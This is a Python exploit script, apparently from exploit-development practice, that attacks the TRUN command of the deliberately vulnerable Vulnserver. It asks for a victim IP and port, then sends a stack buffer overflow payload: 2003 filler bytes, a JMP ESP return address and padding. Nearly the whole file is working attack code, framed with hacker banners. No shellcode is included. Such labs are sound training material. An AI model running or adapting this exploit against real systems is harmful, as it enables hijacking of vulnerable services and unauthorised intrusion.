#!/usr/bin/env python3
print ("# #########################################")
print ("#  Fuzz TRUN instruction | Vulnserver   ####")
print ("#     PWNEDCR \x03  | Exploit Dev      ####")
print ("#           Exploit By r0r0x_xxx       ####")
print ("#           Date: 5-12-2020 	       ####")
print ("#       Simple Buffer Overflow   	   ####")
print ("###########################################")

#Banner

print (" _    _                         _    _            _    _             ")
print ("| |  | |                       | |  | |          | |  (_)            ")
print ("| |__| | __ _ _ __  _ __  _   _| |__| | __ _  ___| | ___ _ __   __ _ ")
print ("|  __  |/ _` | '_ \| '_ \| | | |  __  |/ _` |/ __| |/ / | '_ \ / _` |")
print ("| |  | | (_| | |_) | |_) | |_| | |  | | (_| | (__|   <| | | | | (_| |")
print ("|_|  |_|\__,_| .__/| .__/ \__, |_|  |_|\__,_|\___|_|\_\_|_| |_|\__, |")
print ("             | |   | |     __/ |                                __/ |")
print ("             |_|   |_|    |___/                                |___/ ")


from socket import socket, AF_INET, SOCK_STREAM, timeout, error
from sys import exit

timeout_val = 5 #seconds
host = input("Enter the victim ip address: ")
port = input("Enter the remote port of the victim: ")
victim = ((host, int(port)))

#badchars = \x00
#625011AF JMP ESP = \xAF\x11\x50\x62

payload = b""
payload += b"TRUN /.:/"
payload += b"\x41" * 2003
payload += b"\xAF\x11\x50\x62"
payload += b"\x43" * (5013 - len(payload))


if __name__ == "__main__":
    print: ('[*] Creating the Socket')
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(timeout_val)

    try:
        print ('[*] Connecting to the windows VM')
        s.connect(victim)
        print('[*] Sending BOMB...')
        s.send(payload)
        print('[*]PWNED')
        s.close()
        
    except timeout:
        print ('[!] Socket timeout occurred, check the vulnserver app')
        print ('\check the debugger')
        exit(1)
        
    except error:
        print ('[!] The Socket does not work, Dude wake up!')
        exit(1)
        
        
            
   













